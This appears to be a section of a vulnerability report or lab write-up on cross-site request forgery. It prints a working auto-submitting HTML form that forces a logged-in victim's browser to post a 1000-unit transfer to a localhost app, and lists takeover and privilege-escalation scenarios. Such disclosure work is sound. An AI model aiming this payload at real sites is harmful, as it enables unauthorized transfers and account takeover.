# Exploitation Payloads and Scenarios

## Payload Used
To exploit the vulnerability, the following HTML payload was hosted externally and opened while the user's session was active:

```html
<html>
  <body>
    <form action="http://localhost:8080/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>```
## Exploitation Scenarios
1. **Unauthorized Financial Transactions:** As demonstrated in the payload, if the vulnerability exists in a banking or e-commerce application, an attacker can forge a request to transfer funds (e.g., `amount=1000`) or make unauthorized purchases using the victim's active session.
2. **Account Takeover / State Change:** An attacker can trick a logged-in user into unknowingly submitting a form that changes their account email address or password to one controlled by the attacker, leading to a complete account takeover.
3. **Privilege Escalation:** If the victim is an administrator, the attacker could forge a request that creates a new admin user or grants administrative privileges to an existing attacker-controlled account.
